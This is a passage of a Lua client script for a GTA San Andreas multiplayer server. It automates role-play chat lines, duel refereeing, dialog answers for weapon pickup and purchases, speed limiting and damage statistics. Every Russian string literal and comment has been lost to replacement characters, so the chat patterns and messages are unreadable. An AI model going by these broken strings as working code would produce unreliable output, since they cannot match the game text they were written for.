				sampAddChatMessage(" {8470FF}" .. z .. " {" .. clist .. "}" .. fn .. "_" .. sn .. "[" .. id .. "]{8470FF}: " .. txt .. "", 0xFF8470FF)
				return false
			end
		end

		if not duel.mode then
			local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
			local myn, myf = sampGetPlayerNickname(myid):match("(.*)%_(.*)")
			local f, n = text:match(" (.*)%_(.*) ������.? �������� ��� ���� " .. myn .. " " .. myf .. "")
			if f == nil then return end
			local nick = "" .. f .. "_" .. n .. ""
			local id = sampGetPlayerIdByNickname(nick)
			if f ~= nil then
				duel.mode = true
				duel.en.id = id
				lua_thread.create(function()
					sampAddChatMessage("{FF0000}[LUA]: {fffafa}" .. nick .. "[" .. id .. "] �������� ��� �� �����. ������� Y ��� �������� � N ��� ������", 0x00FFFAFA)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ���������.", 0xFFFF0000) sampSendChat("/me ��������" .. RP .. " �� ��������� ��������") duel.mode = false duel.en = -1 return end end
					if not duel.mode then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ��������.", 0xFFFF0000) duel.mode = false duel.en.id = -1 return end

					duel.fightmode = true
					duel.en.hp = sampGetPlayerHealth(id)
					duel.en.arm = sampGetPlayerArmor(id)
					duel.my.hp = sampGetPlayerHealth(myid)
					duel.my.arm = sampGetPlayerArmor(myid)
					local abc = ((duel.en.hp ~= duel.my.hp) or (duel.my.arm ~= duel.en.arm)) and "�������� �����" or "�����"
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� �������. ������� ������", 0xFFFF0000)
					sampSendChat("/me ������" .. RP .. " ��������� ��������")
					wait(1300)
					sampSendChat("/do *����� �����*: \"".. abc .. ": " .. myn .. " " .. myf .. " vs " .. f .. " " .. n .. " �������� ����� 3!\"")
					math.randomseed(os.time())
					local A_Index = 1

					while true do
						wait(0)
						local myHP = sampGetPlayerHealth(myid)
						local myARM = sampGetPlayerArmor(myid)
						local enHP = sampGetPlayerHealth(id)
						local enARM = sampGetPlayerArmor(id)

						if myHP ~= duel.my.hp or enHP ~= duel.en.hp or myARM ~= duel.my.arm or enARM ~= duel.en.arm then 
							wait(600)
							sampSendChat("/do *����� �����*: \"���������! ����� ��������!\"")
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							return
						end

						wait(1000)
						local delay = math.random(1, 3)
						wait(4000 - delay * 1000)
						sampSendChat("/do *����� �����*: \"" .. (A_Index == 1 and "2!" or A_Index == 2 and "1!" or "GO!") .. "\"")
						if A_Index == 3 then break end
						A_Index = A_Index + 1
					end

					while true do
						wait(0)
						local myHP = sampGetPlayerHealth(myid)
						local enHP = sampGetPlayerHealth(id)
						if myHP <= 12 or enHP <= 12 then 
							sampSendChat("/do *����� �����*: \"".. abc .. " ��������! ���������� - " .. (myHP <= 12 and "".. f .. " " .. n .. "" or "" .. myn .. " " .. myf .. "") .. "!\"")
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							return
						end
					end
				end) 
			end
		end

		if duel.mode and not duel.fightmode then
			local f, n = text:match( "" .. sampGetPlayerNickname(duel.en.id) .. " ��������.? �� ��������� ��������")
			if f ~= nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ���������.", 0xFFFF0000) duel.mode = false duel.en.id = -1 return end
			local f2, n2 = text:match( "" .. sampGetPlayerNickname(duel.en.id) .. " ������.? ��������� ��������")
			if f2 ~= nil then 
				duel.fightmode = true
				lua_thread.create(function()
					local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
					local id = duel.en.id
					while true do
						wait(0)
						if not duel.mode then return end
						local myHP = sampGetPlayerHealth(myid)
						local enHP = sampGetPlayerHealth(id)
						if myHP <= 12 or enHP <= 12 then
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							break
						end
					end
				end)
			end
		end
end

function ev.onSetPlayerColor(id, color)
	if rCache.enable and rCache.smem[id] ~= nil and config_ini.bools[41] == 1 then
		--[[ local clist = ("%06x"):format(bit.band (bit.rshift(color, 8), 0xFFFFFF)) 
		local clist = clist == "ffff" and "fffafa" or clist ]]
		local r, g, b, a = explode_argb(color)
		rCache.smem[id].color = join_argb(500.0, r, g, b)
		rCache.smem[id].colorns = join_argb(150.0, r, g, b)
	end
end

function join_argb(a, r, g, b)
   local argb = b  -- b
   argb = bit.bor(argb, bit.lshift(g, 8))  -- g
   argb = bit.bor(argb, bit.lshift(r, 16)) -- r
   argb = bit.bor(argb, bit.lshift(a, 24)) -- a
   return argb
 end

 function explode_argb(argb)
   local a = bit.band(bit.rshift(argb, 24), 0xFF)
   local r = bit.band(bit.rshift(argb, 16), 0xFF)
   local g = bit.band(bit.rshift(argb, 8), 0xFF)
   local b = bit.band(argb, 0xFF)
   return a, r, g, b
 end

function ev.onPlayerChatBubble(playerId, color, distance, duration, message)
	if config_ini.bools[15] == 1 and (message == "��������� ��������" or message == "���������� ��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. sampGetPlayerNickname(playerId) .. "[" .. playerId .. "] - ��������� ��������", 0xFFFF0000) end
end

--[ML] (script) Binder for CO by Belka version 1.41.lua: 2048   Sergey_Reddle - Desert Eagle +47.0
--[ML] (script) Binder for CO by Belka version 1.41.lua: 2049   Sergey_Reddle - Desert Eagle +47.0

function findsquad()
	--rCache.font = renderCreateFont("Trebuc", 9, FCR_BORDER + FCR_BOLD)
	rCache = {enable = false, squaddata = {}, smem = {}}
	for i = 0, 2303 do
		if sampTextdrawIsExists(i) and sampTextdrawGetString(i):find("SQUAD") then
			sampTextdrawSetPos(i, 1488, 1488)
			--local x, y = sampTextdrawGetPos(i)
			--rCache.pos.x, rCache.pos.y = convertGameScreenCoordsToWindowScreenCoords(x == 1488 and x - 1485 or x + 1, y == 1488 and y - 1341 or y - 50)
			local list = sampTextdrawGetString(i):split("~n~")
			table.remove(list, 1)
			for k, v in ipairs(list) do
				wait(0)
				local id = sampGetPlayerIdByNickname(v)
				if id then
					local color = sampGetPlayerColor(id)
           			local a, r, g, b = explode_argb(color)
					--[[ local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
					local clist = clist == "ffff" and "fffafa" or clist ]]
						
					rCache.smem[id] = {["name"] = v, ["color"] = join_argb(230.0, r, g, b), ["colorns"] = join_argb(150.0, r, g, b), ["time"] = 0}
				end
			end
			rCache.enable = true
			break
        end
		
		
    end
end

function ev.onCreate3DText(id, color, position, distance, testLOS , attachedPlayerId, attachedVehicleId, text)
	lua_thread.create(function() 
		if config_ini.bools[53] == 1 then
			local cen = tonumber(text:match("���� �� 200�%: %$(%d+)"))
			if cen ~= nil then
				local ncost = tonumber(config_ini.dial[4])
				if ncost ~= nil and cen <= ncost then
					sampSendChat("/get fuel")
					if isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then skipd[3][7][1] = true skipd[3][7][2] = id end
				end
			end
		end
	end)
	return
end

function ev.onRemove3DTextLabel(id)
	if skipd[3][7][1] and id == skipd[3][7][2] then skipd[3][7][1] = false end
end

function ev.onShowDialog(dialogid, style, title, button1, button2, text)
		--print(dialogid, style, title, button1, button2, text)
		if dialogid == 245 and title == "����� ������" then
				istakesomeone = false
				if AutoDeagle then
					local a = getAmmoInCharWeapon(PLAYER_PED, 24)
					if a <= 61 then sampSendDialogResponse(dialogid, 1, 0, "") istakesomeone = true isdeagletaken = true return false end
				end

				if AutoShotgun then
					local a = getAmmoInCharWeapon(PLAYER_PED, 25)
					if a <= 28 then sampSendDialogResponse(dialogid, 1, 1, "") istakesomeone = true isshotguntaken = true return false end
				end

				if AutoSMG then
					local a = getAmmoInCharWeapon(PLAYER_PED, 29)
					if a <= 178 then sampSendDialogResponse(dialogid, 1, 2, "") istakesomeone = true issmgtaken = true return false end
				end

				if AutoM4A1 then
					local a = getAmmoInCharWeapon(PLAYER_PED, 31)
					if a <= 290 then sampSendDialogResponse(dialogid, 1, 3, "") istakesomeone = true ism4a1taken = true return false end
				end

				if AutoRifle then
					local a = getAmmoInCharWeapon(PLAYER_PED, 33)
					if a <= 28 then sampSendDialogResponse(dialogid, 1, 4, "") istakesomeone = true isrifletaken = true return false end
				end

				if AutoPar and (os.time() > partimer) then
					local a = getAmmoInCharWeapon(PLAYER_PED, 46)
					if a ~= 1 then sampSendDialogResponse(dialogid, 1, 6, "") istakesomeone = true ispartaken = true partimer = os.time() + 60 return false end
				end

				if not isarmtaken then sampSendDialogResponse(dialogid, 1, 5, "") istakesomeone = true isarmtaken = true return false end

				if not istakesomeone then
						if AutoOt then
							 	local otsrt = ""
								if isarmtaken then otsrt = "����������" end
								if isdeagletaken then otsrt = otsrt == "" and "Desert Eagle" or "" .. otsrt .. ", Desert Eagle" end
								if isshotguntaken then otsrt = otsrt == "" and "Shotgun" or "" .. otsrt .. ", Shotgun" end
								if issmgtaken then otsrt = otsrt == "" and "HK MP-5" or "" .. otsrt .. ", HK MP-5" end
								if ism4a1taken then otsrt = otsrt == "" and "M4A1" or "" .. otsrt .. ", M4A1" end
								if isrifletaken then otsrt = otsrt == "" and "Country Rifle" or "" .. otsrt .. ", Country Rifle" end
								if ispartaken then otsrt = otsrt == "" and "�������" or "" .. otsrt .. ", �������" end
								if otsrt ~= "" then sampSendChat("/me ����" .. RP .. " �� ������ " .. otsrt .. "") end
						end
						sampCloseCurrentDialogWithButton(0)
						isarmtaken, isdeagletaken, isshotguntaken, issmgtaken, ism4a1taken, isrifletaken, ispartaken, istakesomeone, whatwastaken = false, false, false, false, false, false, false, false, {}
						if config_ini.bools[46] == 1 and skipd[1].pid == skipd[2][6] then sampSendPickedUpPickup(skipd[2][5]) end
						return false
				end
		end

		if dialogid == 22 then
			if refmem1.status and title == "������ ������" then
				refmem1.text = text
				return false
			elseif otmmode and title == "������ �������" then
				local list = text:split("\n")
				for k, v in ipairs(list) do
					local nick, rank, auth, online, onlineall = v:match("%[%d+%] (%a+_%a+) 	(%d+) 	(%d+/%d+/%d+ %d+:%d+:%d+) 	(%d+) / (%d+) �����")
					if nick and rank and auth and soptlist[1][nick] ~= nil then
						soptlist[1][nick] = onlineall
					end
				end
			
				if text:find(">> ����.��������", 1, true) then
					lua_thread.create(function() wait(1000) sampSendDialogResponse(22, 1, 40, '>> ����.��������') end)
				else
					otmmode = false
				end
				
				return false
			else end
		end
		
		if config_ini.bools[45] == 1 and dialogid == 288 and text:match("1 ����: ����") then
			if skipd[1].pid == skipd[2][2] and skipd[1].obool then --2213
				sampSendDialogResponse(dialogid, 1, 1, "")
				sampCloseCurrentDialogWithButton(0)
				return false
			elseif skipd[1].pid == skipd[2][3] or skipd[1].pid == skipd[2][4] then -- 2213 - 2214
				sampSendDialogResponse(dialogid, 1, 0, "")
				sampCloseCurrentDialogWithButton(0)
				return false
			end		
		end

		if config_ini.bools[49] == 1 then -- ������� ������� ��������
			if dialogid == 22 and style == 0 and title == "���������" and button1 == "�������" and button2 == "�����" then 
				local val = tonumber(text:match("��������� ������� (%d+) ����"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[1])
					if ncost ~= nil and val <= ncost then skipd[3][1] = true sampSendDialogResponse(dialogid, 1, 0, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end

			if dialogid == 22 and style == 2 and title == "��������" and button1 == "�������" and button2 == "�����" and skipd[3][1] then skipd[3][1] = false sampCloseCurrentDialogWithButton(0) return false end
		end

		if config_ini.bools[50] == 1 and dialogid == 16 and style == 4 and title == "������� 24/7" and button1 == "������" and button2 == "������" then -- ������� ������� 24/7
			if skipd[3][2] == 3 then sampSendDialogResponse(dialogid, 0, 1, "") sampCloseCurrentDialogWithButton(0) skipd[3][2] = 1 return false end
			
			if skipd[3][2] == 0 then
				local val = tonumber(text:match("�������� %������������%�	%[%$(%d+)%]"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[2])
					if ncost ~= nil and val <= ncost then sampSendDialogResponse(dialogid, 1, 8, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end

			if skipd[3][2] == 1 then
				local val = tonumber(text:match("������ �� �����������	%[%$(%d+)%]"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[2])
					if ncost ~= nil and val <= ncost then sampSendDialogResponse(dialogid, 1, 10, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end
		end

		if config_ini.bools[47] == 1 and dialogid == 184 and style == 0 and title == "����������" and button1 == "��" and button2 == "���" and text == "�� ������ ������ ������� ����?" then sampSendDialogResponse(dialogid, 1, 0, "") return false end
		if config_ini.bools[47] == 1 and dialogid == 185 and style == 2 and title == "����������" and button1 == "�����" and button2 == "������" and text:match("��������� ������� ����") then sampSendDialogResponse(dialogid, 1, 0, "") return false end

		if config_ini.bools[48] == 1 and dialogid == 42 and style == 2 and title == "�������� ����������" and button1 == "�������" and button2 == "�����" and (skipd[3][3] or skipd[3][8][1]) then
			skipd[3][8][1] = false
			if skipd[3][3] then sampCloseCurrentDialogWithButton(0) skipd[3][3] = false return false end
			if skipd[3][5] then sampSendDialogResponse(42, 1, 7) skipd[3][3] = true return false end

			-- ����� ����������� ���������� ������� ���� �� ������� VMO.lua, �� ��� �������������� ����
			local LVax, LVay, SFPDx, SFPDy, LVPDx, LVPDy, LSPDx, LSPDy, FBIx, FBIy, SFax, SFay = 328, 1945,-1605,680, 2230, 2470, 1530, -1683, -2420, 500, -1300, 475
			local CoordX, CoordY = getCharCoordinates(PLAYER_PED)
			local tarr = {[1] = ((LVax - CoordX)^2+(LVay-CoordY)^2)^0.5, [2] = ((LSPDx - CoordX)^2+(LSPDy-CoordY)^2)^0.5, [3] = ((SFPDx - CoordX)^2+(SFPDy-CoordY)^2)^0.5, [4] = ((LVPDx - CoordX)^2+(LVPDy-CoordY)^2)^0.5, [5] = ((FBIx - CoordX)^2+(FBIy-CoordY)^2)^0.5, [6] = ((SFax - CoordX)^2+(SFay-CoordY)^2)^0.5}
			local FractionBase = indexof(math.min(tarr[1], tarr[2], tarr[3], tarr[4], tarr[5], tarr[6]), tarr)
			local req_index = FractionBase ~= 1 and FractionBase or skipd[3][4] ~= 10000 and 0 or 1
			sampSendDialogResponse(dialogid, 1, req_index, "")
			return false
		end
end

function ev.onSendGiveDamage(playerId, damage, weapid, bodypart)
	if weapid ~= nil and (weapid == 23 or weapid == 24 or weapid == 25 or weapid == 29 or weapid == 30 or weapid == 31 or weapid == 33) then
		show.show_dmind.damind.hits[weapid] = show.show_dmind.damind.hits[weapid] + 1
		show.show_dmind.damind.damage[weapid] = show.show_dmind.damind.damage[weapid] + damage
		show.show_dmind.damind.hits[1] = show.show_dmind.damind.hits[1] + 1
		show.show_dmind.damind.damage[1] = show.show_dmind.damind.damage[1] + damage
	end
end

function ev.onSendBulletSync(targetType, targetId,  origin, target, center, weaponId)
	local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED))
	if weapid ~= nil and (weapid == 23 or weapid == 24 or weapid == 25 or weapid == 29 or weapid == 30 or weapid == 31 or weapid == 33) then 
		show.show_dmind.damind.shots[weapid] = show.show_dmind.damind.shots[weapid] + 1
		show.show_dmind.damind.shots[1] = show.show_dmind.damind.shots[1] + 1 
	end

	if config_ini.bools[57] == 1 and autopred.current_weapon == weapid and not autopred.firstshot then 
		local temparr = {[23] = 1, [24] = 2, [25] = 3, [29] = 4, [31] = 5, [30] = 6, [33] = 7}
		if temparr[weapid] ~= nil then 
			lua_thread.create(function() autopred.firstshot = true wait(600) sampSendChat("/me ����" .. RP .. " � �������������� " .. config_ini.UserGun[temparr[weapid]] .. "")  end)		 
		end
	end
end

function ev.onSendExitVehicle(vehid)
	local result, car = sampGetCarHandleBySampVehicleId(vehid)
	if result and getDriverOfCar(car) == PLAYER_PED then
		local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900", [468] = "Sanchez", [462] = "Faggio"}
		local carid = getCarModel(car)
		if motos[carid] ~= nil and not isCarPassengerSeatFree(car, 0) then
			local passenger = getCharInCarPassengerSeat(car, 0)
			local result, id = sampGetPlayerIdByCharHandle(passenger)
			if result then lua_thread.create(function() sampSendChat("/eject " .. id .. "") wait(500) sampSendExitVehicle(vehid) end) return false end
		end
	end
end

function ev.onSendPickedUpPickup(id)
	if skipd[2][1] == 1 then print(id) end
	skipd[1].pid = id
	if not afkstatus and not show.othervars.saccess then
		if id == skipd[2][7] then local a = os.time() - (3600 * tonumber(config_ini.Settings.timep)) lua_thread.create(function() wait(501) sampSendChat("/fs sq_message_id_1_" .. a .. "") end) return end
		if id == skipd[2][8] then lua_thread.create(function() wait(501) sampSendChat("/fs sq_message_id_2") end) return end
	end

	if isKeyDown(vkeys.VK_CONTROL) and getPickupModel(id) == 353 then
		sampSendChat("/inventory drop 13")	 --1045 1050
		lua_thread.create(function() wait(600) sampSendPickedUpPickup(id) end)
		return false
	end

end

function f_matovoz()
	while true do
		wait(0)
		if isCharInAnyCar(PLAYER_PED) then
			if config_ini.bools[48] == 1 and getCarModel(storeCarCharIsInNoSave(PLAYER_PED)) == 433 then
				if not skipd[3][8][2] then
					for k, v in ipairs(skipd[3][8][3]) do
						wait(0)
						if isCharInArea2d(PLAYER_PED, v.x1, v.y1, v.x2, v.y2, false) then
							if k == 1 then if skipd[3][4] ~= 10000 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ��������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ���������.", 0xffff0000) end end
									
							if skipd[3][4] == 0 and k ~= 1 then 
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/carm �� ����� ������ ��� ��� �������� ������.", 0xffff0000)
								skipd[3][8][4] = v
								skipd[3][8][2] = true
								break		
							end

							sampSendChat("/carm")
							skipd[3][8][1] = true
							skipd[3][8][4] = v
							skipd[3][8][2] = true
							break								
						end
					end
				else
					while isCharInArea2d(PLAYER_PED, skipd[3][8][4].x1, skipd[3][8][4].y1, skipd[3][8][4].x2, skipd[3][8][4].y2, false) do wait(0) end
					skipd[3][8][2] = false
					skipd[3][8][4] = {}
				end
			end
		end
	end
end
function f_incar()
	local speedbool = false
	while true do
		wait(0)
		if isCharInAnyCar(PLAYER_PED) then
			if needtohold then setGameKeyState(16, 256) end

			if config_ini.bools[31] == 1 and not SetMode then
				if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then
					if wasKeyPressed(vkeys.VK_RBUTTON) then crosMode = true showcmc = true show.rand = math.random(1, 5) end
					if wasKeyReleased(vkeys.VK_RBUTTON) and not pCros then crosMode = false showcmc = false end
					if PLAYER_PED ~= getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) then
							if wasKeyPressed(vkeys.VK_CAPITAL) or wasKeyPressed(vkeys.VK_H) then crosMode = true pCros = true show.rand = math.random(1, 5) end
					end

				--	if crosMode then renderDrawPolygon(sx, sy, 0.5, 0.5, 12, 0xFFFF0000) end
				end
			end

			
			
		end

		
		if config_ini.bools[53] == 1 and skipd[3][7][1] == true then while true do wait(0) if not skipd[3][7][1] or getCarSpeed(storeCarCharIsInNoSave(PLAYER_PED)) == 0 then break end end if skipd[3][7][1] then skipd[3][7][1] = false lua_thread.create(function() wait(500) sampSendChat("/fill") end) end end

		if spsyns.mode and spsyns.firstshow then
			while isKeyDown(vkeys.VK_CONTROL) do wait(0) end
			spsyns.firstshow = false
			local cidcar = getCarModel(spsyns.car)
			local cresult2, cid = sampGetVehicleIdByCarHandle(spsyns.car)
			local fcar = cIDs[cid] == nil and cid or cIDs[cid]
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������������� �������� � " .. tVehicleNames[cidcar-399] .. " [" .. fcar .. "].")	
			spsyns.time = os.clock()
			lua_thread.create(function()						
				while true do
					wait(0)
					if not doesVehicleExist(spsyns.car) or getDriverOfCar(spsyns.car) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������/�������� �������. ������������� �������� (#000)!") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if not isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� �������� ���������. ������������� �������� (#002).") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if isKeyDown(vkeys.VK_CONTROL) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��������� ������������� ��������.") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if spsyns.time + 0.65 <= os.clock() then
						local myspeed = math.floor(getCarSpeed(storeCarCharIsInNoSave(PLAYER_PED)) * 2)
						local hspeed = math.floor(getCarSpeed(spsyns.car) * 2)
						if myspeed ~= hspeed then
							if hspeed < 20 or hspeed > 90 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���������������� ��������. ������������� �������� (#001)!") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
							sampSendChat("/slimit " .. hspeed .. "")
							spsyns.time = os.clock()
						end
					end
				end		
			end)	
		end

		if isCharInAnyCar(PLAYER_PED) and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
			if isKeyDown(vkeys.VK_CONTROL) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then
				while isKeyDown(vkeys.VK_CONTROL) do wait(0) end
				local speed = getCarModel(storeCarCharIsInNoSave(PLAYER_PED)) == 433 and 30 or 50
				sampSendChat("/slimit" .. (speedbool and "" or " " .. speed .. "") .. "")
				speedbool = not speedbool
			end
		else
			if speedbool then speedbool = false end
		end
	end
end

function f_onfoot()
	while true do
		wait(0)
		if isCharOnFoot(PLAYER_PED) then
			if needtohold then setGameKeyState(1, -256) end

			if config_ini.bools[31] == 1 and not SetMode then
				showcmc = false
				pCros = false
				if tonumber(getCurrentCharWeapon(PLAYER_PED)) == 33 then
					if wasKeyPressed(vkeys.VK_RBUTTON) then crosMode = true showcmc = true end
					if wasKeyReleased(vkeys.VK_RBUTTON) then crosMode = false showcmc = false end
				else
					if memory.getint8(ped + 0x528, false) == 19 then crosMode = true else crosMode = false end
				end							
			end
		end
	end
end

function f_ckey() -- ### ����������� �������
	while true do
		wait(0)					
		if CTaskArr[10][1] ~= "" then -- ID 10
			local kv = kvadrat()
			if kv ~= nil and kv == CTaskArr[10][1] then
				CTaskArr[10][1] = ""
				table.insert(CTaskArr[1], 10)
				table.insert(CTaskArr[2], os.time())
				table.insert(CTaskArr[3], kv)
			end
		end

		------------ id 5 and 9
		local car = isCharInAnyCar(PLAYER_PED) and storeCarCharIsInNoSave(PLAYER_PED) or -1
		local idc = car ~= -1 and getCarModel(car) or -1
		local x, y, z = getCharCoordinates(PLAYER_PED) -- ID 5 � 6
		if idc == 433 and getDriverOfCar(car) == PLAYER_PED then	
			if not CTaskArr[10][2][2] then
				CTaskArr[10][2][2] = true	
				if x >= 266 and x <= 287 and y >= 1940 and y <= 2004 and z > 16 and z < 30 then
					table.insert(CTaskArr[1], 5)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		elseif idc == 497 and getDriverOfCar(car) == PLAYER_PED then	
			if not CTaskArr[10][6] then
				CTaskArr[10][6] = true	
				if x >= 189 and x <= 224 and y >= 1923 and y <= 1939 and z > 22 and z < 25 then
					table.insert(CTaskArr[1], 9)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		else
			if CTaskArr[10][2][2] then -- �������
				CTaskArr[10][2][2] = false
				if x >= 266 and x <= 287 and y >= 1940 and y <= 2004 and z > 16 and z < 30 then	
					table.insert(CTaskArr[1], 6)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end

			if CTaskArr[10][6] then
				CTaskArr[10][6] = false -- ��������
				if x >= 189 and x <= 224 and y >= 1923 and y <= 1939 and z > 22 and z < 25 then	
					table.insert(CTaskArr[1], 11)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		end

		----------- id 8
		if isCharOnFoot(PLAYER_PED) then
			local car = storeClosestEntities(PLAYER_PED)
			if car ~= -1 and not CTaskArr[10][5] then
				local myX, myY, myZ = getCharCoordinates(PLAYER_PED) -- �������� ���� ����������
				local cX, cY, cZ = getCarCoordinates(car) -- �������� ���������� ������
				local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2))) 
				if (getCarHealth(car) == 300 or (isCarTireBurst(car, 0) or isCarTireBurst(car, 1) or isCarTireBurst(car, 2) or isCarTireBurst(car, 3) or isCarTireBurst(car, 4))) and distanse <= 5 then
					table.insert(CTaskArr[1], 8)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], "")
					CTaskArr[10][5] = true
				end
			end
		end

		if CTaskArr[10][5] then -- ���� ������ �� ������ �� ����� ������ ������� ��������� �� 100 ���. ����� ��� �������� �������� ����������
			local bool = false
			local car = storeClosestEntities(PLAYER_PED)
			if car == -1 then 
				bool = true
			else
				local myX, myY, myZ = getCharCoordinates(PLAYER_PED) -- �������� ���� ����������
				local cX, cY, cZ = getCarCoordinates(car) -- �������� ���������� ������
				local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2)))
				if (getCarHealth(car) > 300 and not isCarTireBurst(car, 0) and not isCarTireBurst(car, 1) and not isCarTireBurst(car, 2) and not isCarTireBurst(car, 3) and not isCarTireBurst(car, 4)) or distanse > 5 then
					local key = indexof(8, CTaskArr[1])
					if key ~= false then CTaskArr[2][key] = os.time() - 100 end
				end
			end
		end

		-- id 12
		--[[ if not CTaskArr[10][7] then
			local carhandles = getcars() -- �������� ��� ������ ������
			if carhandles ~= nil then -- ���� ������ ����������
				local ignorecars = {[497] = "Rhino", [488] = "Hydra", [487] = "Hunter", [476] = "Hunter", [460] = "Hunter", [417] = "Hunter", [512] = "Hunter", [513] = "Hunter", [548] = "Hunter", [563] = "Hunter", [593] = "Hunter"} -- �� ������������ �����
				for k, v in ipairs(carhandles) do -- ������� ���� ����� � ����������
					if doesVehicleExist(v) then -- ���� ������ �� ������
						local idcar = getCarModel(v) -- �������� �� ��������
						if ignorecars[idcar] == nil and isCarOnScreen(v) and not sampGetPlayerIdByCharHandle(getDriverOfCar(v)) and getMaximumNumberOfPassengers(v) > 0 then
							for i = 0, getMaximumNumberOfPassengers(v) - 1 do
								if not isCarPassengerSeatFree(v, i) then
									local h = getCharInCarPassengerSeat(v, i)
									local result, id = sampGetPlayerIdByCharHandle(h)
									if result then
										table.insert(CTaskArr[1], 12)
										table.insert(CTaskArr[2], os.time())
										table.insert(CTaskArr[3], select(2, sampGetPlayerIdByCharHandle(h)))
										CTaskArr[10][7] = true
										break
									end
								end
							end
						end
					end
				end
			end
		end

		if CTaskArr[10][7] then
			local key = indexof(12, CTaskArr[1])
			if key ~= false then 
				local r, h = sampGetCharHandleBySampPlayerId(CTaskArr[3][key])
				if r and isCharOnScreen(h) and isCharInAnyCar(h) and not sampGetPlayerIdByCharHandle(getDriverOfCar(storeCarCharIsInNoSave(h))) then
				else
					CTaskArr[2][key] = os.time() - 100 
				end
			end
		end ]]
		----------- id 3
		if CTaskArr[10][4] and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
			CTaskArr[10][4] = false
			table.insert(CTaskArr[1], 3)
			table.insert(CTaskArr[2], os.time())
			table.insert(CTaskArr[3], "")
		end
		--	[ML] (script) coordinater.lua: 266.38027954102   1940.4320068359   17.640625
		--	[ML] (script) coordinater.lua: 287.63711547852   2004.6898193359   17.640625
		sortCarr() --### ������� ������� ����������� �������, ���������� ������ ������������ ��������
	end
end

function main()
	if not isSampLoaded() or not isSampfuncsLoaded() then return end
			while not isSampAvailable() do wait(100) end
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������� ��������.", 0xFFFF0000)
			prepare()
			while not preparecomplete do wait(0) end

			rkeys.unRegisterHotKey(makeHotKey(13))
			imgui.Process = true
			imgui.ShowCursor = false
			imgui.LockPlayer = false
			sx, sy = convert3DCoordsToScreen(get_crosshair_position())
			ped = getCharPointer(PLAYER_PED)
			PICKUP_POOL = sampGetPickupPoolPtr()

			if config_ini.bools[58] == 1 then displayHud(false) end
			lua_thread.create(function() f_incar() end)
			lua_thread.create(function() f_onfoot() end)
			lua_thread.create(function() f_ckey() end)
			lua_thread.create(function() f_matovoz() end)

			if config_ini.day_info.today ~= os.date("%a") then 
				config_ini.day_info.today = os.date("%a")
				config_ini.day_info.online = 0
				config_ini.day_info.full = 0
				config_ini.day_info.afk = 0
				dfuls = 0
		  	end
   
			if config_ini.week_info.week ~= number_week() then
				config_ini.week_info.week = number_week()
				config_ini.week_info.online = 0
				config_ini.week_info.full = 0
				config_ini.week_info.afk = 0
				wfuls = 0
				for k, v in pairs(config_ini.online) do v = 0 end            
		   	end

			if not access.saccess then lua_thread.create(function() aa_time() end) end

			while true do
					wait(0)
					--if isSampAvailable() then memory.setint8(0xB7CEE4, 1) end -- ����. ���

					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					if suspendkeys == 2 then
							rkeys.registerHotKey(makeHotKey(13), true, hk_13)
							rkeys.registerHotKey(makeHotKey(1), true, hk_1)
							rkeys.registerHotKey(makeHotKey(2), true, hk_2)
